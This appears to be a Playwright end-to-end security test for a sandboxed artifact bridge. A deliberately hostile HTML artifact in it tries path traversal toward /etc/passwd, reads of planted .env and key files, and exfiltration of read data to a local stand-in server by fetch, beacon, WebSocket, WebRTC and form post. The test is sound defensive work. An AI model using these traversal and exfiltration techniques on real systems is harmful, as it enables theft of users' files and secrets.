// 3.6 (G38.7): «artefatti cattivi», the artifacts' bridge in a real browser. With the bridge on and
// granted, hostile artifacts try every way out and every abuse of the bridge; all must fail, while a
// legit artifact (a dashboard over dati/*.csv, a question to its agent, a saved score) works.
//   ways out with data read through the bridge: fetch, beacon, image, WebSocket, EventSource,
//     import(), worker, WebRTC, window.open, top navigation, a form post, its own navigation, a
//     message to the chat without a click (waits in the strip: the person sees it);
//   bridge abuse: a folder not declared, a declared folder not granted, path traversal (.., %2e,
//     backslashes, absolute, file:), links leading out of the folder, out of the project and into
//     RedGiant's data folder, a declared folder that is itself a link out, secrets (.env,
//     secrets.json, keys, the keychain), hidden files, a huge read, a huge storage, a flood of
//     questions and writes, a call naming another artifact (ref, scope, path in its params), a call
//     from a child frame, a forged answer posted to itself, another artifact replaying a granted
//     capability, an imported copy of a granted artifact.
// A local "outside" server and a STUN listener must hear nothing.
// Usage: DEMO_ARTIFACTS=1 node demo-server.mjs <port>, then
//        [CHROMIUM=/path/to/chrome] node bridge-e2e.mjs <url> <token> <outdir> <orchestratorId> <sessionId>
// Writes <outdir>/results.json and screenshots; exits 1 on a failure.
import { createSocket } from "node:dgram";
import { mkdir, symlink, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { dirname, join } from "node:path";
import { chromium } from "playwright-core";

const [url, token, out, orchId, sessionId] = process.argv.slice(2);
await mkdir(out, { recursive: true });
const auth = { authorization: `Bearer ${token}`, "content-type": "application/json" };
const api = async (method, path, body) => {
  const r = await fetch(`${url}${path}`, {
    method,
    headers: auth,
    ...(body !== undefined && { body: typeof body === "string" ? body : JSON.stringify(body) }),
  });
  const text = await r.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {}
  return { status: r.status, body: json, raw: text };
};

// ---- the "internet" ------------------------------------------------------------------------
const heard = [];
const outside = createServer((req, res) => {
  heard.push(`${req.method} ${req.url}`);
  res.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
  res.end("x");
});
outside.on("upgrade", (req, socket) => {
  heard.push(`UPGRADE ${req.url}`);
  socket.destroy();
});
await new Promise((r) => outside.listen(0, "127.0.0.1", r));
const ext = `http://localhost:${outside.address().port}`;
const stun = createSocket("udp4");
const stunHeard = [];
stun.on("message", (_m, from) => stunHeard.push(`${from.address}:${from.port}`));
await new Promise((r) => stun.bind(0, "127.0.0.1", r));
const stunPort = stun.address().port;

// ---- the project's files ---------------------------------------------------------------------
const projects = (await api("GET", "/api/projects")).body;
const demo = projects.find((p) => p.id === "demo");
if (!demo) throw new Error("no Demo project");
const root = demo.path;
// workspaces/<owner>/demo → the data folder is above workspaces/.
const dataDir = dirname(dirname(dirname(root)));
const put = async (path, content) => {
  const w = await api("PUT", "/api/files/content", { scope: "project:demo", path, content });
  if (w.status !== 200) throw new Error(`write ${path}: ${w.status} ${w.raw}`);
};
const SECRET = "sk-ant-api03-SEGRETOe2eNONDEVEUSCIRE1234567890";
await put("dati/vendite.csv", "mese,euro\ngennaio,120\nfebbraio,95\nmarzo,140\n");
await put("dati/costi.csv", "mese,euro\ngennaio,80\nfebbraio,70\nmarzo,90\n");
await put("dati/.env", `ANTHROPIC_API_KEY=${SECRET}\n`);
await put("dati/secrets.json", JSON.stringify({ token: SECRET }));
await put("dati/chiave.pem", `-----BEGIN PRIVATE KEY-----\n${SECRET}\n`);
await put("src/riservato.txt", `fuori dalla cartella concessa ${SECRET}`);
await writeFile(
  join(root, "dati", "logo.png"),
  Buffer.from("89504e470d0a1a0a0000000d49484452", "hex"),
);
await writeFile(join(root, "dati", "enorme.bin"), Buffer.alloc(11 * 1024 * 1024, 65));
await writeFile(join(dataDir, "secrets.json"), JSON.stringify({ e2e: SECRET })).catch(() => {});
const link = (target, at) => symlink(target, join(root, at)).catch(() => {});
await link(join(root, "src"), "dati/fuori");
await link("/etc/hostname", "dati/host.txt");
await link(dataDir, "dati/rg");
await link(join(dataDir, "secrets.json"), "dati/segreti-rg.json");
await link("/etc", "fuori");

// The demo's project is over its budget on purpose (its header shows it): room for the questions.
for (const b of (await api("GET", "/api/budgets")).body ?? [])
  if (b.limit?.usd !== undefined && b.used.usd >= b.limit.usd)
    await api("PUT", "/api/budgets", { scope: b.scope, id: b.id, usd: b.used.usd + 100 });

// ---- the artifacts ---------------------------------------------------------------------------
const head = (name, wants, from = orchId) =>
  `<!-- redgiant-artifact ${JSON.stringify({ name, version: 1, libs: [], wants, from })} -->\n`;
/** Shared helpers inside an artifact: try a call, keep its outcome, report when done. */
const KIT = `
const R = {};
const show = () => { document.getElementById("out").textContent = JSON.stringify(R, null, 1); };
const t = async (name, fn) => {
  // Paced, so each try meets what it tests and not the calls-per-second limit.
  await new Promise((r) => setTimeout(r, 80));
  try { const v = await fn(); R[name] = { ok: true, v: typeof v === "string" ? v.slice(0, 120) : v }; }
  catch (e) { R[name] = { ok: false, code: e && e.code, msg: String(e && e.message).slice(0, 160) }; }
  show();
};
const raw = (params, id) => new Promise((ok) => {
  const timer = setTimeout(() => { removeEventListener("message", on); ok("no answer"); }, 4000);
  const on = (e) => { const d = e.data; if (e.source === parent && d && d.method === "redgiant/bridge-result" && d.id === id) { clearTimeout(timer); removeEventListener("message", on); ok(d.error ? "error " + d.error.code : JSON.stringify(d.result).slice(0, 120)); } };
  addEventListener("message", on);
  parent.postMessage({ jsonrpc: "2.0", method: "redgiant/bridge", id, params }, "*");
});
const done = () => { R.done = true; show(); document.title = "done"; };
`;
const page = (h, body, script) =>
  `${h}<!doctype html><html><head><title>e2e</title></head><body>${body}<pre id="out"></pre><script type="module">${KIT}\n${script}</script></body></html>`;

const legit = page(
  head("Cruscotto vendite", ["files:dati/", "storage", "ask"]),
  "<h1>Cruscotto</h1>",
  `
await t("list", async () => (await redgiant.files.list("dati/")).map((e) => e.name).join(","));
await t("csv", async () => (await redgiant.files.read("dati/vendite.csv")).split("\\n")[1]);
await t("png", async () => (await redgiant.files.read("dati/logo.png", { as: "arraybuffer" })).byteLength);
await t("save", async () => { await redgiant.storage.set("record", JSON.stringify({ nome: "Ada", punti: 42 })); return "saved"; });
await t("load", async () => JSON.parse(await redgiant.storage.get("record")).punti);
await t("ask", async () => redgiant.ask("Riassumi in una riga: gennaio 120, febbraio 95, marzo 140"));
done();
`,
);

const cattivo = page(
  head("Cattivo", ["files:dati/", "storage", "ask", "files:fuori/"]),
  '<h1>Cattivo</h1><form id="f" method="post" action="' +
    ext +
    '/form"><input name="d" value=""></form>',
  `
let csv = "";
await t("legit read (to have data to leak)", async () => (csv = await redgiant.files.read("dati/vendite.csv")).length);
// Bridge abuse: paths.
for (const p of ["src/riservato.txt", "dati/../src/riservato.txt", "../../../../etc/passwd", "/etc/passwd", "dati\\\\..\\\\src\\\\riservato.txt", "dati/%2e%2e/src/riservato.txt", "file:///etc/passwd", "dati/fuori/riservato.txt", "dati/host.txt", "dati/rg/secrets.json", "dati/segreti-rg.json", "dati/rg/keychain/vault", "dati/.env", "dati/secrets.json", "dati/chiave.pem", "artefatti/.dati/cruscotto.json", "fuori/hostname", "fuori/passwd"])
  await t("read " + p, () => redgiant.files.read(p));
await t("list dati/fuori", () => redgiant.files.list("dati/fuori"));
await t("list ..", () => redgiant.files.list(".."));
await t("list dati shows no secret", async () => (await redgiant.files.list("dati/")).map((e) => e.name).join(","));
await t("huge read", () => redgiant.files.read("dati/enorme.bin", { as: "arraybuffer" }));
// Storage abuse.
await t("storage 6 MB", () => redgiant.storage.set("big", "x".repeat(6 * 1024 * 1024)));
await t("storage of another artifact (its key)", () => redgiant.storage.get("record"));
// A call that names another artifact: the page sends its own.
R["call naming the legit artifact"] = await raw({ op: "storage.get", key: "record", scope: "project:demo", path: "artefatti/cruscotto.html", ref: { kind: "file", scope: "project:demo", path: "artefatti/cruscotto.html" } }, 900001);
R["call with a bad shape"] = await raw({ op: "files.write", path: "dati/x.csv", text: "x" }, 900002);
R["call with a number as value"] = await raw({ op: "storage.set", key: "a", value: 5 }, 900003);
// A forged answer posted to itself never resolves a call.
await t("forged answer to itself", () => new Promise((ok, no) => {
  const p = redgiant.storage.get("nothing");
  for (let i = 1; i < 400; i++) window.postMessage({ jsonrpc: "2.0", method: "redgiant/bridge-result", id: i, result: { value: "FORGED" } }, "*");
  p.then((v) => (v === "FORGED" ? ok("FORGED") : ok("genuine: " + v)), no);
}));
// A call from a child frame: the page knows only this frame's window.
await t("call from a child frame", () => new Promise((ok) => {
  const f = document.createElement("iframe");
  addEventListener("message", (e) => { if (e.data && e.data.child) ok("child says: " + e.data.child); });
  f.srcdoc = "<script>let n=0;addEventListener('message',e=>{if(e.data&&e.data.method==='redgiant/bridge-result'){parent.postMessage({child:'ANSWERED '+JSON.stringify(e.data).slice(0,80)},'*')}});try{top.postMessage({jsonrpc:'2.0',method:'redgiant/bridge',id:777,params:{op:'files.read',path:'dati/vendite.csv'}},'*');parent.postMessage({child:'posted'},'*')}catch(e){parent.postMessage({child:'blocked '+e.name},'*')}<\\/script>";
  document.body.append(f);
  setTimeout(() => ok("child never ran"), 3000);
}));
await new Promise((r) => setTimeout(r, 3000));
R["child frame answered?"] = R["call from a child frame"];
// Flooding: questions and writes.
const asks = await Promise.allSettled(Array.from({ length: 30 }, (_, i) => redgiant.ask("domanda " + i)));
R["flood ask"] = { answered: asks.filter((a) => a.status === "fulfilled").length, refused: asks.filter((a) => a.status === "rejected").map((a) => a.reason.code).reduce((m, c) => ((m[c] = (m[c] || 0) + 1), m), {}) };
const writes = await Promise.allSettled(Array.from({ length: 200 }, (_, i) => redgiant.storage.set("k" + i, "v")));
R["flood storage"] = { written: writes.filter((a) => a.status === "fulfilled").length, refused: writes.filter((a) => a.status === "rejected").length };
// Ways out, with the data read.
const d = encodeURIComponent(csv);
await t("fetch", () => fetch(${JSON.stringify(ext)} + "/fetch?d=" + d, { mode: "no-cors" }).then(() => "SENT"));
await t("beacon", async () => (navigator.sendBeacon(${JSON.stringify(ext)} + "/beacon", csv) ? "queued" : "blocked"));
await t("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok("LOADED"); i.onerror = () => no(Object.assign(new Error("blocked"), { code: "blocked" })); i.src = ${JSON.stringify(ext)} + "/img?d=" + d; }));
await t("websocket", () => new Promise((ok, no) => { try { const w = new WebSocket(${JSON.stringify(ext.replace("http", "ws"))} + "/ws?d=" + d); w.onopen = () => ok("OPEN"); w.onerror = () => no(Object.assign(new Error("blocked"), { code: "blocked" })); } catch (e) { no(e); } }));
await t("eventsource", () => new Promise((ok, no) => { try { const s = new EventSource(${JSON.stringify(ext)} + "/sse?d=" + d); s.onopen = () => ok("OPEN"); s.onerror = () => no(Object.assign(new Error("blocked"), { code: "blocked" })); } catch (e) { no(e); } }));
await t("import()", () => import(${JSON.stringify(ext)} + "/m.js?d=" + d).then(() => "LOADED"));
await t("worker", async () => { new Worker(URL.createObjectURL(new Blob(["fetch('${ext}/worker')"]))); return "made"; });
await t("webrtc", async () => { const P = window.RTCPeerConnection || window.webkitRTCPeerConnection; if (!P) return "none"; const pc = new P({ iceServers: [{ urls: "stun:127.0.0.1:${stunPort}" }] }); pc.createDataChannel(d.slice(0, 50)); await pc.setLocalDescription(await pc.createOffer()); return "MADE"; });
await t("window.open", async () => (window.open(${JSON.stringify(ext)} + "/open?d=" + d) ? "OPENED" : "handed to the page"));
await t("top navigation", async () => { top.location.href = ${JSON.stringify(ext)} + "/top?d=" + d; return "tried"; });
await t("send to chat without a click", async () => { redgiant.sendMessage("Dati rubati: " + csv); return "asked"; });
done();
setTimeout(() => { try { const f = document.getElementById("f"); f.d.value = csv; f.submit(); } catch (e) {} }, 1000);
setTimeout(() => { location.href = ${JSON.stringify(ext)} + "/selfnav?d=" + d; }, 2500);
`,
);

// Another artifact, the same wants: what the first was granted is not its own.
const replay = page(
  head("Copione", ["files:dati/", "storage"]),
  "<h1>Copione</h1>",
  `
await t("replay read", () => redgiant.files.read("dati/vendite.csv"));
await t("replay storage", () => redgiant.storage.get("record"));
done();
`,
);
// Another maker: the agent is gone.
const orphan = page(
  head("Orfano", ["ask"], "agent_scomparso"),
  "<h1>Orfano</h1>",
  `
await t("ask with no maker", () => redgiant.ask("ciao"));
done();
`,
);
// Asks for nothing: every call is refused before anyone is asked.
const undeclared = page(
  `<!-- redgiant-artifact ${JSON.stringify({ name: "Senza permessi", version: 1, libs: [] })} -->\n`,
  "<h1>Senza permessi</h1>",
  `
await t("undeclared read", () => redgiant.files.read("dati/vendite.csv"));
await t("undeclared ask", () => redgiant.ask("x"));
await t("undeclared storage", () => redgiant.storage.get("x"));
done();
`,
);
for (const [path, content] of [
  ["artefatti/cruscotto.html", legit],
  ["artefatti/cattivo.html", cattivo],
  ["artefatti/copione.html", replay],
  ["artefatti/orfano.html", orphan],
  ["artefatti/senza-permessi.html", undeclared],
])
  await put(path, content);

// ---- the person: answers the grant requests -----------------------------------------------------
/** Which artifacts the person lets in (the hostile one too: abuse is tried with the bridge on). */
const ALLOW = new Set(["artefatti/cruscotto.html", "artefatti/cattivo.html"]);
const cards = [];
let personOn = true;
const personLoop = (async () => {
  while (personOn) {
    const pending = (await api("GET", "/api/permissions")).body ?? [];
    for (const r of pending) {
      if (r.tool !== "artifact_capability") continue;
      if (cards.some((c) => c.requestId === r.requestId)) continue;
      cards.push({ requestId: r.requestId, path: r.input.path, capability: r.input.capability });
      // The first card is looked at in the page before it is answered.
      if (cards.length === 1) await new Promise((ok) => setTimeout(ok, 1500));
      const decision = ALLOW.has(r.input.path) ? "allow" : "deny";
      await api("POST", `/api/permissions/${r.requestId}`, { decision });
    }
    await new Promise((ok) => setTimeout(ok, 250));
  }
})();

// ---- the browser --------------------------------------------------------------------------------
const results = { checks: [], artifacts: {} };
let failed = false;
const check = (ok, what) => {
  console.log(`${ok ? "ok  " : "FAIL"} ${what}`);
  results.checks.push({ ok: !!ok, what });
  if (!ok) failed = true;
};
const browser = await chromium.launch(
  process.env.CHROMIUM ? { executablePath: process.env.CHROMIUM } : {},
);
const context = await browser.newContext({
  viewport: { width: 1440, height: 900 },
  locale: "it-IT",
});
const pg = await context.newPage();
const popups = [];
pg.on("popup", (p) => popups.push(p.url()));
pg.on("pageerror", (e) => console.error("pageerror:", e.message));

async function openArtifact(path) {
  const view = {
    id: `file:project:demo:${path}`,
    type: "canvas",
    title: path.split("/").pop(),
    target: { kind: "file", scope: "project:demo", path },
  };
  await pg.goto(`${url}/#token=${token}`);
  await pg.evaluate(
    ([v, sid, orch]) => {
      localStorage.setItem("rg.remoteNotice", "hidden");
      localStorage.setItem("rg.newsSeen", "9.9.9");
      localStorage.setItem("rg.canvas", JSON.stringify({ views: [v], active: v.id }));
      if (sid)
        localStorage.setItem(
          "rg.tabs",
          JSON.stringify({
            tabs: [
              { id: `chat:${sid}`, type: "chat", title: "Demo", sessionId: sid, agentId: orch },
            ],
            active: `chat:${sid}`,
          }),
        );
    },
    [view, sessionId, orchId],
  );
  // A real load (the same address with only a new hash would not reload the page).
  await pg.goto(`${url}/?load=${Date.now()}#token=${token}`);
  await pg
    .waitForSelector(".canvas .artifact-frame iframe", { timeout: 30000 })
    .catch(async (e) => {
      await pg.screenshot({ path: join(out, "FAILED-open.png") });
      console.log(
        "     canvas:",
        (
          await pg
            .locator(".canvas, .side")
            .first()
            .innerHTML()
            .catch(() => "none")
        ).slice(0, 600),
      );
      throw e;
    });
  return pg.frameLocator(".canvas .artifact-frame iframe").last();
}

async function runArtifact(path, name, shot) {
  const before = heard.length;
  const frame = await openArtifact(path);
  // The first grant card, seen in the page (the chat in front, or the bell).
  if (shot === "card") {
    const card = pg.locator(".artifact-grant").first();
    const seen = await card.waitFor({ timeout: 8000 }).then(
      () => true,
      () => false,
    );
    results.cardSeen = seen;
    console.log(
      `     the grant card ${seen ? "is shown in the page" : "was not seen in the page (answered from the API)"}`,
    );
    if (seen) {
      results.cardText = (await card.textContent())?.slice(0, 300);
      await pg.screenshot({ path: join(out, "1-grant-card.png") });
    }
  }
  await frame
    .locator("pre#out")
    .filter({ hasText: '"done": true' })
    .waitFor({ timeout: 120000 })
    .catch(async (e) => {
      await pg.screenshot({ path: join(out, `FAILED-${name}.png`) });
      console.log(
        `     ${name} so far:`,
        (
          await frame
            .locator("pre#out")
            .textContent()
            .catch(() => "?")
        )?.slice(-1500),
      );
      throw e;
    });
  const r = JSON.parse((await frame.locator("pre#out").textContent()) ?? "{}");
  results.artifacts[name] = r;
  await pg.screenshot({ path: join(out, `${name}.png`) });
  return { r, heardNow: heard.slice(before) };
}

// 1. The legit one works with everything granted.
{
  const { r } = await runArtifact("artefatti/cruscotto.html", "legit", "card");
  check(
    r.list?.ok && /vendite\.csv/.test(r.list.v) && !/\.env|secrets|chiave/.test(r.list.v),
    `legit: lists dati/ without secrets (${r.list?.v ?? r.list?.code})`,
  );
  check(r.csv?.ok && r.csv.v === "gennaio,120", "legit: reads a CSV");
  check(r.png?.ok && r.png.v === 16, "legit: reads a picture as an ArrayBuffer");
  check(r.load?.ok && r.load.v === 42, "legit: saves and reads back its storage");
  check(
    r.ask?.ok && typeof r.ask.v === "string" && r.ask.v.length > 0,
    `legit: its agent answers (${r.ask?.v ?? r.ask?.code})`,
  );
}

// 2. The hostile one, granted the same, plus a folder that is a link out.
{
  const usersBefore =
    (await api("GET", `/api/sessions/${sessionId}/events`)).body?.filter(
      (e) => e.type === "message.user",
    ).length ?? 0;
  const { r } = await runArtifact("artefatti/cattivo.html", "hostile");
  const refused = (name, codes = ["forbidden", "not_found"]) =>
    check(
      r[name] && r[name].ok === false && codes.includes(r[name].code),
      `hostile: ${name} → ${r[name]?.ok ? `READ ${JSON.stringify(r[name].v).slice(0, 60)}` : r[name]?.code}`,
    );
  for (const p of [
    "src/riservato.txt",
    "dati/../src/riservato.txt",
    "../../../../etc/passwd",
    "/etc/passwd",
    "dati\\\\..\\\\src\\\\riservato.txt",
    "dati/fuori/riservato.txt",
    "dati/host.txt",
    "dati/rg/secrets.json",
    "dati/segreti-rg.json",
    "dati/rg/keychain/vault",
    "dati/.env",
    "dati/secrets.json",
    "dati/chiave.pem",
    "artefatti/.dati/cruscotto.json",
    "fuori/hostname",
    "fuori/passwd",
    "file:///etc/passwd",
    "dati/%2e%2e/src/riservato.txt",
  ])
    refused(`read ${p.replace(/\\\\/g, "\\")}`, ["forbidden", "not_found", "not_declared"]);
  refused("list dati/fuori");
  refused("list ..");
  check(
    r["list dati shows no secret"]?.ok &&
      !/\.env|secrets|chiave|host|rg|fuori/.test(r["list dati shows no secret"].v),
    `hostile: the folder's list hides secrets and links out (${r["list dati shows no secret"]?.v})`,
  );
  refused("huge read", ["too_big"]);
  refused("storage 6 MB", ["too_big"]);
  check(
    r["storage of another artifact (its key)"]?.ok &&
      r["storage of another artifact (its key)"].v === null,
    "hostile: another artifact's storage is not its own",
  );
  check(
    r["call naming the legit artifact"] === '{"value":null}',
    `hostile: a call naming another artifact gets its own (${r["call naming the legit artifact"]})`,
  );
  check(
    r["call with a bad shape"] === "error bad_request" &&
      r["call with a number as value"] === "error bad_request",
    `hostile: calls of a bad shape are refused by the page (${r["call with a bad shape"]}, ${r["call with a number as value"]})`,
  );
  check(
    r["forged answer to itself"]?.ok && r["forged answer to itself"].v !== "FORGED",
    `hostile: a forged answer resolves nothing (${r["forged answer to itself"]?.v})`,
  );
  check(
    r["child frame answered?"]?.ok && !/ANSWERED/.test(r["child frame answered?"].v),
    `hostile: a call from a child frame is ignored (${r["child frame answered?"]?.v})`,
  );
  check(
    r["flood ask"] && r["flood ask"].answered <= 6,
    `hostile: a flood of questions is cut (${JSON.stringify(r["flood ask"])})`,
  );
  check(
    r["flood storage"] && r["flood storage"].refused > 0,
    `hostile: a flood of writes is cut (${JSON.stringify(r["flood storage"])})`,
  );
  for (const k of ["fetch", "image", "websocket", "eventsource", "import()"])
    check(!r[k]?.ok, `hostile: ${k} with the data → ${r[k]?.ok ? r[k].v : "blocked"}`);
  check(r.webrtc?.v !== "MADE", `hostile: WebRTC → ${r.webrtc?.ok ? r.webrtc.v : r.webrtc?.msg}`);
  check(r["window.open"]?.v !== "OPENED", "hostile: window.open is handed to the page");
  // The form and the self-navigation come a moment later.
  await pg.waitForTimeout(5000);
  check(pg.url().startsWith(url), "hostile: RedGiant's page stays (no top navigation)");
  check(popups.length === 0, `hostile: no window opened (${popups.join(", ")})`);
  const strip = await pg.locator(".artifact-ask").count();
  const usersAfter =
    (await api("GET", `/api/sessions/${sessionId}/events`)).body?.filter(
      (e) => e.type === "message.user",
    ).length ?? 0;
  check(
    usersAfter === usersBefore,
    `hostile: nothing reached the chat without a click (strip shown: ${strip})`,
  );
  await pg.screenshot({ path: join(out, "hostile-after.png") });
}

// 3. Another artifact replays the grant; an orphan asks; one that declares nothing.
{
  const { r } = await runArtifact("artefatti/copione.html", "replay");
  check(
    r["replay read"]?.code === "denied" && r["replay storage"]?.code === "denied",
    "replay: another artifact is asked again (the person says no)",
  );
  const o = (await runArtifact("artefatti/orfano.html", "orphan")).r;
  check(
    o["ask with no maker"]?.code === "no_agent",
    `orphan: a clear error (${o["ask with no maker"]?.msg})`,
  );
  const u = (await runArtifact("artefatti/senza-permessi.html", "undeclared")).r;
  check(
    ["undeclared read", "undeclared ask", "undeclared storage"].every(
      (k) => u[k]?.code === "not_declared",
    ),
    "undeclared: refused before asking anyone",
  );
}

// 4. An imported copy of the granted one starts with nothing.
{
  const zip = await fetch(
    `${url}/api/artifacts/export?scope=project:demo&path=artefatti/cruscotto.html&as=zip&data=1`,
    { headers: { authorization: `Bearer ${token}` } },
  );
  const bytes = new Uint8Array(await zip.arrayBuffer());
  const imp = await fetch(`${url}/api/artifacts/import?scope=project:demo`, {
    method: "POST",
    headers: { authorization: `Bearer ${token}`, "content-type": "application/octet-stream" },
    body: bytes,
  });
  const got = await imp.json();
  check(got.dataImported === true, "import: the copy carries its data (chosen at export)");
  const list = (await api("GET", "/api/artifacts")).body;
  const copy = list.find((a) => a.path === got.path);
  check(
    copy && copy.granted.length === 0 && copy.pendingRun,
    `import: ${got.path} starts with nothing granted, not run`,
  );
  await api("POST", "/api/artifacts/run", { scope: "project:demo", path: got.path });
  const before = cards.length;
  const { r } = await runArtifact(got.path, "imported");
  check(
    !r.csv?.ok && r.csv?.code === "denied",
    "import: its first read asks the person again (no)",
  );
  check(cards.length > before, "import: a new grant card for the copy");
}

personOn = false;
await personLoop;
await new Promise((r) => setTimeout(r, 1500));
check(heard.length === 0, `the outside server heard nothing (${heard.join(", ")})`);
check(stunHeard.length === 0, `the STUN listener heard nothing (${stunHeard.length})`);
const leaked = JSON.stringify(results.artifacts).includes(SECRET);
check(!leaked, "no secret reached any artifact");
results.cards = cards;
results.heard = heard;
results.stun = stunHeard.length;
results.failed = failed;
await writeFile(join(out, "results.json"), `${JSON.stringify(results, null, 2)}\n`);
await browser.close();
outside.close();
stun.close();
console.log(failed ? "SOME CHECKS FAILED" : "all checks passed");
process.exit(failed ? 1 : 0);
